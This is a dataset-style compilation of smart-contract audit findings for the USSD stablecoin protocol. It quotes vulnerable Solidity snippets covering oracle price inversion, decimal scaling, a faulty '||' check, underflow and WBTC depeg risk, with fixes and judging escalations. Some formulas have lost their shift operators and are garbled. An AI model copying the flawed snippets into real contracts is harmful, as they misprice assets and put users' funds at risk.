should.\nAlso worth mentioning that `USSDRebalancer::rebalance()` also relies on the result of this price calculation and will make it perform trades with incorrect values.чCalculate the inverse of the `price` returned by the Chainlink feed so that it can be averaged with the pool `price`, making sure that both use the correct `WETH/DAI` and `ETH/DAI` base/rate tokens.\nDiscussion\nT1MOH593\nEscalate for 10 USDC\nThis is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909. It tells about using DAI/ETH instead of ETH/DAI on Chainlink. And #909 tells about completely different issue with oracles\nsherlock-admin\nEscalate for 10 USDC\nThis is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909. It tells about using DAI/ETH instead of ETH/DAI on Chainlink. And #909 tells about completely different issue with oracles\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xJuancito\nEscalate for 10 USDC\nAgree with the previous comment.\nThis is an independent High impact finding. It is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909, and hasn't been exposed by other findings selected for report.\nIt's main point is explained on the Summary:\nThe problem is that it uses WETH/DAI as the base/rate tokens for the pool, and DAI/ETH for the Chainlink feed, which is the opposite.\nA more detailed explanation and recommendation to fix it is included on the rest of the report.\nPossible duplicates:\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/795\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/774\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/491\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/269\nsherlock-admin\nEscalate for 10 USDC\nAgree with the previous comment.\nThis is an independent High impact finding. It is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909, and hasn't been exposed by other findings selected for report.\nIt's main point is explained on the Summary:\nThe problem is that it uses WETH/DAI as the base/rate tokens for the pool, and DAI/ETH for the Chainlink feed, which is the opposite.\nA more detailed explanation and recommendation to fix it is included on the rest of the report.\nPossible duplicates:\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/795\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/774\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/491\nhttps://github.com/sherlock-audit/2023-05-USSD-judging/issues/269\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\nSee my comments in https://github.com/sherlock-audit/2023-05-USSD-judging/issues/555\nhrishibhat\nResult: High Has duplicates This is a valid separate issue.\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nT1MOH593: accepted\n0xJuancito: acceptedчUsers will receive far more USSD tokens than they should when they call `mintForToken()`, ruining the token value.\nWhen performed the `USSDRebalancer::rebalance()`, all the calculations will be broken for the DAI oracle, leading to incorrect pool trades due to the error in `getPrice()`\nCode Snippet\nTool used\nManual Review
`USSDRebalancer.sol#SellUSSDBuyCollateral` the check of whether collateral is DAI is wrongчhighч```\n196       for (uint256 i = 0; i < collateral.length; i++) {\n197         uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n198         if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n199         if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n200             // don't touch DAI if it's needed to be bought (it's already bought)\n201             IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n202           }\n203         }\n204       }\n```\nчThe `SellUSSDBuyCollateral` function use `||` instand of `&&` to check whether the collateral is DAI. It is wrong and may cause `SellUSSDBuyCollateral` function revert.\n```\n196       for (uint256 i = 0; i < collateral.length; i++) {\n197         uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n198         if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n199         if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n200             // don't touch DAI if it's needed to be bought (it's already bought)\n201             IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n202           }\n203         }\n204       }\n```\n\nLine 199 should use `&&` instand of `||` to ensure that the token is not DAI. If the token is DAI, the `UniV3SwapInput` function will revert because that DAI's `pathbuy` is empty.ч```\n      for (uint256 i = 0; i < collateral.length; i// Add the line below\n// Add the line below\n) {\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n// Remove the line below\n         if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n// Add the line below\n         if (collateral[i].token != uniPool.token0() && collateral[i].token != uniPool.token1()) {\n            // don't touch DAI if it's needed to be bought (it's already bought)\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n          }\n        }\n      }\n```\nчThe `SellUSSDBuyCollateral` will revert and USSD will become unstable.\nCode Snippet\nTool used\nManual Review
The getOwnValuation() function contains errors in the price calculationчhighч```\n  price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))/(1e6)  (96 * 2);\n```\nчThe getOwnValuation() function in the provided code has incorrect price calculation logic when token0() or token1() is equal to USSD. The error leads to inaccurate price calculations.\nThe `USSDRebalancer.getOwnValuation()` function calculates the price based on the sqrtPriceX96 value obtained from the uniPool.slot0() function. The calculation depends on whether token0() is equal to USSD or not. If token0() is equal to USSD, the price calculation is performed as follows:\n```\n  price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))/(1e6)  (96 * 2);\n```\n\nHowever,there is an error in the price calculation logic. The calculation should be:\n```\nprice = uint(sqrtPriceX96) * uint(sqrtPriceX96) * 1e6  (96 * 2);\n```\n\nIf token0() is not equal to USSD, the price calculation is slightly different:\n```\n price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e18 /* 1e12 + 1e6 decimal representation */)  (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```\n\nThe calculation should be:\n```\n price = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e6 /* 1e12 + 1e6 decimal representation */)  (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```\n\nReference link: https://blog.uniswap.org/uniswap-v3-math-primerчWhen token0() is USSD, the correct calculation should be uint(sqrtPriceX96) * uint(sqrtPriceX96) * 1e6 >> (96 * 2). When token1() is USSD, the correct calculation should be\n```\nprice = uint(sqrtPriceX96)*(uint(sqrtPriceX96))*(1e6 /* 1e12 + 1e6 decimal representation */)  (96 * 2);\n        // flip the fraction\n        price = (1e24 / price) / 1e12;\n```\nчThe incorrect price calculation in the getOwnValuation() function can lead to significant impact on the valuation of assets in the UniSwap V3 pool. The inaccurate prices can result in incorrect asset valuations, which may affect trading decisions, liquidity provision, and overall financial calculations based on the UniSwap V3 pool.\nCode Snippet\nTool used\nManual Review
The price from `StableOracleDAI` is returned with the incorrect number of decimalsчhighч```\n    function getPriceUSD() external view override returns (uint256) {\n        address[] memory pools = new address[](1);\n        pools[0] = 0x60594a405d53811d3BC4766596EFD80fd545A270;\n        uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n            1000000000000000000, // 1 Eth\n            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token)\n            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token)\n            pools, // DAI/WETH pool uni v3\n            600 // period\n        );\n\n        uint256 wethPriceUSD = ethOracle.getPriceUSD();\n\n        // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n        //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n        (, int256 price,,,) = priceFeedDAIETH.latestRoundData();\n\n        return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n    }\n```\nчThe price returned from the `getPriceUSD` function of the `StableOracleDAI` is scaled up by `1e10`, which results in 28 decimals instead of the intended 18.\nIn `StableOracleDAI` the `getPriceUSD` function is defined as follows...\n```\n    function getPriceUSD() external view override returns (uint256) {\n        address[] memory pools = new address[](1);\n        pools[0] = 0x60594a405d53811d3BC4766596EFD80fd545A270;\n        uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n            1000000000000000000, // 1 Eth\n            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token)\n            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token)\n            pools, // DAI/WETH pool uni v3\n            600 // period\n        );\n\n        uint256 wethPriceUSD = ethOracle.getPriceUSD();\n\n        // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n        //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n        (, int256 price,,,) = priceFeedDAIETH.latestRoundData();\n\n        return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);\n    }\n```\n\nThe assumption is made that the `DAIWethPrice` is 8 decimals, and is therefore multiplied by `1e10` in the return statement to scale it up to 18 decimals.\nThe other price feeds used in the protocol are indeed received with decimals, however, the Chainlink DAI/ETH price feed returns a value with 18 decimals as can be seen on their site.\nhttps://docs.chain.link/data-feeds/price-feeds/addressesчRemove the `* 1e10` from the return statement.\n```\n// Remove the line below\n   return (wethPriceUSD * 1e18) / ((DAIWethPrice // Add the line below\n uint256(price) * 1e10) / 2);\n// Add the line below\n   return (wethPriceUSD * 1e18) / (DAIWethPrice // Add the line below\n uint256(price) / 2);\n```\nчThis means that the price returned from the `getPriceUSD` function is scaled up by `1e10`, which results in 28 decimals instead of the intended 18, drastically overvaluing the DAI/USD price.\nThis will result in the USSD token price being a tiny fraction of what it is intended to be. Instead of being pegged to $1, it will be pegged to $0.0000000001, completely defeating the purpose of the protocol.\nFor example, if a user calls `USSD.mintForToken`, supplying DAI, they'll be able to mint `1e10` times more USSD than intended.\nCode Snippet\nTool used\nManual Review
Wrong computation of the amountToSellUnit variableчhighч```\n// @audit-issue Wrong computation\nuint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n```\nчThe variable `amountToSellUnits` is computed wrongly in the code which will lead to an incorrect amount of collateral to be sold.\nThe `BuyUSSDSellCollateral()` function is used to sell collateral during a peg-down recovery event. The computation of the amount to sell is computed using the following formula:\n```\n// @audit-issue Wrong computation\nuint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n```\n\nThe idea is to sell an amount which is equivalent (in USD) to the ratio of `amountToBuyLeftUSD / collateralval`. Flattening the equation it ends up as:\n```\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD * 1e18) / (collateralval * 1e18 * 1e18);\n\n// Reducing the equation\nuint256 amountToSellUnits = (collateralBalance * amountToBuyLeftUSD) / (collateralval * 1e18);\n```\n\n`amountToBuyLeftUSD` and `collateralval` already have 18 decimals so their decimals get cancelled together which will lead the last 1e18 factor as not necessary.чDelete the last 1e18 factorчThe contract will sell an incorrect amount of collateral during a peg-down recovery event.\nCode Snippet\nTool used\nManual Review
Calls to Oracles don't check for stale pricesчmediumч```\n(, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n\nreturn\n    (wethPriceUSD * 1e18) /\n    ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```\nчCalls to Oracles don't check for stale prices.\nNone of the oracle calls check for stale prices, for example StableOracleDAI.getPriceUSD():\n```\n(, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n\nreturn\n    (wethPriceUSD * 1e18) /\n    ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```\nч"
rebalance process incase of selling the collateral, could revert because of underflow calculationчmediumч```\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval > amountToBuyLeftUSD) {\n          // sell a portion of collateral and exit\n          if (collateral[i].pathsell.length > 0) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n            uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n          } else {\n```\nчrebalance process, will try to sell the collateral in case of peg-down. However, the process can revert because the calculation can underflow.\nInside `rebalance()` call, if `BuyUSSDSellCollateral()` is triggered, it will try to sell the current collateral to `baseAsset`. The asset that will be sold (amountToSellUnits) first calculated. Then swap it to `baseAsset` via uniswap. However, when subtracting `amountToBuyLeftUSD`, it with result of `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`. There is no guarantee `amountToBuyLeftUSD` always bigger than `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)`.\nThis causing the call could revert in case `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` > `amountToBuyLeftUSD`.\nThere are two branch where `amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` is performed :\nIncase `collateralval > amountToBuyLeftUSD`\n`collateralval` is calculated using oracle price, thus the result of swap not guaranteed to reflect the proportion of `amountToBuyLefUSD` against `collateralval` ratio, and could result in returning `baseAsset` larger than expected. And potentially `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` > `amountToBuyLeftUSD`\n```\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval > amountToBuyLeftUSD) {\n          // sell a portion of collateral and exit\n          if (collateral[i].pathsell.length > 0) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n            uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n          } else {\n```\n\nIncase `collateralval < amountToBuyLeftUSD`\nThis also can't guarantee `(IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore)` < `amountToBuyLeftUSD`.\n```\n          if (collateralval >= amountToBuyLeftUSD / 20) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n            // sell all collateral and move to next one\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n          }\n```\nч
StableOracleWBTC use BTC/USD chainlink oracle to price WBTC which is problematic if WBTC depegsчmediumч```\ncontract StableOracleWBTC is IStableOracle {\n    AggregatorV3Interface priceFeed;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n\n        );\n    }\n\n    function getPriceUSD() external view override returns (uint256) {\n        (, int256 price, , , ) = priceFeed.latestRoundData();\n        // chainlink price data is 8 decimals for WBTC/USD\n        return uint256(price) * 1e10;\n    }\n}\n```\nчThe StableOracleWBTC contract utilizes a BTC/USD Chainlink oracle to determine the price of WBTC. However, this approach can lead to potential issues if WBTC were to depeg from BTC. In such a scenario, WBTC would no longer maintain an equivalent value to BTC. This can result in significant problems, including borrowing against a devalued asset and the accumulation of bad debt. Given that the protocol continues to value WBTC based on BTC/USD, the issuance of bad loans would persist, exacerbating the overall level of bad debt.\nImportant to note that this is like a 2 in 1 report as the same idea could work on the StableOracleWBGL contract too.\nThe vulnerability lies in the reliance on a single BTC/USD Chainlink oracle to obtain the price of WBTC. If the bridge connecting WBTC to BTC becomes compromised and WBTC depegs, WBTC may depeg from BTC. Consequently, WBTC's value would no longer be equivalent to BTC, potentially rendering it worthless (hopefully this never happens). The use of the BTC/USD oracle to price WBTC poses risks to the protocol and its users.\nThe following code snippet represents the relevant section of the StableOracleWBTC contract responsible for retrieving the price of WBTC using the BTC/USD Chainlink oracle:\n```\ncontract StableOracleWBTC is IStableOracle {\n    AggregatorV3Interface priceFeed;\n\n    constructor() {\n        priceFeed = AggregatorV3Interface(\n            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419\n\n        );\n    }\n\n    function getPriceUSD() external view override returns (uint256) {\n        (, int256 price, , , ) = priceFeed.latestRoundData();\n        // chainlink price data is 8 decimals for WBTC/USD\n        return uint256(price) * 1e10;\n    }\n}\n```\n\nNB: key to note that the above pricefeed is set to the wrong aggregator, the correct one is this: `0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599`ч"To mitigate the vulnerability mentioned above, it is strongly recommended to implement a double oracle setup for WBTC pricing. This setup would involve integrating both the BTC/USD Chainlink oracle and an additional on-chain liquidity-based oracle, such as UniV3 TWAP.\nThe double oracle setup serves two primary purposes. Firstly, it reduces the risk of price manipulation by relying on the Chainlink oracle, which ensures accurate pricing for WBTC. Secondly, incorporating an on-chain liquidity-based oracle acts as a safeguard against WBTC depegging. By monitoring the price derived from the liquidity-based oracle and comparing it to the Chainlink oracle's price, borrowing activities can be halted if the threshold deviation (e.g., 2% lower) is breached.\nAdopting a double oracle setup enhances the protocol's stability and minimizes the risks associated with WBTC depegging. It ensures accurate valuation, reduces the accumulation of bad debt, and safeguards the protocol and its users\nDiscussion\nBauchibred\nEscalate for 10 USDC\nI believe this issue has been incorrectly duplicated to #817. While I acknowledge the large number of issues submitted during the contest (approximately 1000), it's crucial to clarify that the concern here is not solely related to oracle addresses, despite the inclusion of wrong aggregators and inactive oracle addresses in the report. The main issue at hand is the potential depegging of WBTC, which is a bridged asset.\nTo address this vulnerability, the recommendation proposes implementing a double oracle setup for WBTC pricing, which serves as a safeguard against WBTC depegging.\nTo support this escalation, I have provided references to relevant cases:\n#836 is a sponsor-validated issue that emphasizes the importance of not relying solely on 100% of an asset's oracle price. While it may not directly relate to this specific issue, it underscores the need to consider implementing a ""deviation threshold"" when determining asset prices, particularly in the context of bridged assets.\n#862, which is a valid duplicate, explores the potential impact of depegging on the protocol within a different context for this contest.\nAdditionally, references 1 and 2 are previous validated findings from other contests that further emphasize the standalone nature and significance of this issue.\nI believe these references provide additional insights into the importance of considering measures to mitigate risks associated with bridged assets and emphasize why this issue should be treated as a standalone concern.\nsherlock-admin\nEscalate for 10 USDC\nI believe this issue has been incorrectly duplicated to #817. While I acknowledge the large number of issues submitted during the contest (approximately 1000), it's crucial to clarify that the concern here is not solely related to oracle addresses, despite the inclusion of wrong aggregators and inactive oracle addresses in the report. The main issue at hand is the potential depegging of WBTC, which is a bridged asset.\nTo address this vulnerability, the recommendation proposes implementing a double oracle setup for WBTC pricing, which serves as a safeguard against WBTC depegging.\nTo support this escalation, I have provided references to relevant cases:\n#836 is a sponsor-validated issue that emphasizes the importance of not relying solely on 100% of an asset's oracle price. While it may not directly relate to this specific issue, it underscores the need to consider implementing a ""deviation threshold"" when determining asset prices, particularly in the context of bridged assets.\n#862, which is a valid duplicate, explores the potential impact of depegging on the protocol within a different context for this contest.\nAdditionally, references 1 and 2 are previous validated findings from other contests that further emphasize the standalone nature and significance of this issue.\nI believe these references provide additional insights into the importance of considering measures to mitigate risks associated with bridged assets and emphasize why this issue should be treated as a standalone concern.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\ntwicek\nEscalate for 10 USDC\nComments from Bauchibred regarding the fact that the present issue #310 is not a duplicate of #817 are correct. However, the main argument of this report is that:\nWBTC may depeg from BTC\nThe only fact that WBTC/BTC would depeg is questionable. Since it is issued by a centralized entity (BitGo) it should be treated as trusted, because the only way for it to depeg would be via an error of this centralized entity or if the DAO voted a malicious proposal. See for details: https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin#section-how-w-btc-works\nAdditionally, one of the justifications used to support the escalation regarding the deviation threshold mentioned in #836 . There is no guarantee that the TWAP will not stay within the deviation threshold even in the (very) unlikely event that WBTC/BTC depegs if the depegging happens slowly.\nRegarding #862, this is not a duplicate to this report because DAI principal depeg risk comes from depegging of the underlying collateral reserves, which as we have seen is not possible for WBTC since the reserves are held by a centralized party. Also #862 specifically related to an overflow problem during a potential DAI depeg which is totally different than this report.\nThese are all the reason why I think this report is invalid.\nsherlock-admin\nEscalate for 10 USDC\nComments from Bauchibred regarding the fact that the present issue #310 is not a duplicate of #817 are correct. However, the main argument of this report is that:\nWBTC may depeg from BTC\nThe only fact that WBTC/BTC would depeg is questionable. Since it is issued by a centralized entity (BitGo) it should be treated as trusted, because the only way for it to depeg would be via an error of this centralized entity or if the DAO voted a malicious proposal. See for details: https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin#section-how-w-btc-works\nAdditionally, one of the justifications used to support the escalation regarding the deviation threshold mentioned in #836 . There is no guarantee that the TWAP will not stay within the deviation threshold even in the (very) unlikely event that WBTC/BTC depegs if the depegging happens slowly.\nRegarding #862, this is not a duplicate to this report because DAI principal depeg risk comes from depegging of the underlying collateral reserves, which as we have seen is not possible for WBTC since the reserves are held by a centralized party. Also #862 specifically related to an overflow problem during a potential DAI depeg which is totally different than this report.\nThese are all the reason why I think this report is invalid.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\n@Bauchibred any further comments on the validity of the issue due?\nBauchibred\n@hrishibhat I still think issue should be valid and stand on its own, the reply to my escalation was that the idea of “WBTC depegging is not valid”, but I argue that that's wrong, Wrapped BTCs have depegged multiple times in the past, one of the popular instance being after the whole FTX saga, though fair enough that was soBTC, now worth around 7% of what it's supposed to be pegged to.\nNote that Chainlink even provides a separate price feed to query the WBTC/BTC price,seen here.\nSo I still believe that the price of WBTC/USD for more accuracy should be calculated based on WBTC/BTC and BTC/USD price feeds instead of directly using the BTC/USD feed.\nAdditionally this article from the bitcoin manual, could provide more insight on how and why wrapped bitcoins could depeg.\nhrishibhat\nResult: Medium Has duplicates This is not a duplicate of #817 Considering this issue and other duplicates of this issue as a valid medium given the edge case possibility of WBTC de-pegging.\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nBauchibred: accepted\ntwicek: rejected"чShould the WBTC bridge become compromised or WBTC depeg from BTC, the protocol would face severe consequences. The protocol would be burdened with a substantial amount of bad debt stemming from outstanding loans secured by WBTC. Additionally, due to the protocol's reliance on the BTC/USD oracle, the issuance of loans against WBTC would persist even if its value has significantly deteriorated. This would lead to an escalation in bad debt, negatively impacting the protocol's financial stability and overall performance.\nCode Snippet\nTool used\nManual review
Inaccurate collateral factor calculation due to missing collateral assetчmediumч```\n   function collateralFactor() public view override returns (uint256) {\n        uint256 totalAssetsUSD = 0;\n        for (uint256 i = 0; i < collateral.length; i++) {\n            totalAssetsUSD +=\n                (((IERC20Upgradeable(collateral[i].token).balanceOf(\n                    address(this)\n                ) * 1e18) /\n                    (10 **\n                        IERC20MetadataUpgradeable(collateral[i].token)\n                            .decimals())) *\n                    collateral[i].oracle.getPriceUSD()) /\n                1e18;\n        }\n\n        return (totalAssetsUSD * 1e6) / totalSupply();\n    }\n```\nчThe function `collateralFactor()` in the smart contract calculates the collateral factor for the protocol but fails to account for the removal of certain collateral assets. As a result, the total value of the removed collateral assets is not included in the calculation, leading to an inaccurate collateral factor.\nThe `collateralFactor()` function calculates the current collateral factor for the protocol. It iterates through each collateral asset in the system and calculates the total value of all collateral assets in USD.\nFor each collateral asset, the function retrieves its balance and converts it to a USD value by multiplying it with the asset's price in USD obtained from the corresponding oracle. The balance is adjusted for the decimal precision of the asset. These USD values are accumulated to calculate the totalAssetsUSD.\n```\n   function collateralFactor() public view override returns (uint256) {\n        uint256 totalAssetsUSD = 0;\n        for (uint256 i = 0; i < collateral.length; i++) {\n            totalAssetsUSD +=\n                (((IERC20Upgradeable(collateral[i].token).balanceOf(\n                    address(this)\n                ) * 1e18) /\n                    (10 **\n                        IERC20MetadataUpgradeable(collateral[i].token)\n                            .decimals())) *\n                    collateral[i].oracle.getPriceUSD()) /\n                1e18;\n        }\n\n        return (totalAssetsUSD * 1e6) / totalSupply();\n    }\n```\n\nHowever, when a collateral asset is removed from the collateral list, the `collateralFactor` function fails to account for its absence. This results in an inaccurate calculation of the collateral factor. Specifically, the totalAssetsUSD variable does not include the value of the removed collateral asset, leading to an underestimation of the total collateral value. The function `SellUSSDBuyCollateral()` in the smart contract is used for rebalancing. However, it relies on the `collateralFactor` calculation, which has been found to be inaccurate. The `collateralFactor` calculation does not accurately assess the portions of collateral assets to be bought or sold during rebalancing. This discrepancy can lead to incorrect rebalancing decisions and potentially impact the stability and performance of the protocol.\n```\n    function removeCollateral(uint256 _index) public onlyControl {\n        collateral[_index] = collateral[collateral.length - 1];\n        collateral.pop();\n    }\n```\nчEnsure accurate calculations and maintain the integrity of the collateral factor metric in the protocol's risk management system.чAs a consequence, the reported collateral factor may be lower than it should be, potentially affecting the risk assessment and stability of the protocol.\nCode Snippet\nTool used\nManual Review
Inconsistency handling of DAI as collateral in the BuyUSSDSellCollateral functionчmediumч```\nif (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   if (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   else {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\nelse {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   if (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\n```\nчThe above behavior is handled when collateral is about to be sold for DAI, see the comment `no need to swap DAI` (link to the code):\n```\nif (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   if (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   else {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\nelse {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   if (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\n```\n\nThe problem is in the `else branch` of the first if statement `collateralval > amountToBuyLeftUSD`, which lacks the check `if (collateral[i].pathsell.length > 0)`чHandle the case as is the done on the if branch of collateralval > amountToBuyLeftUSD:\n```\nif (collateral[i].pathsell.length > 0) 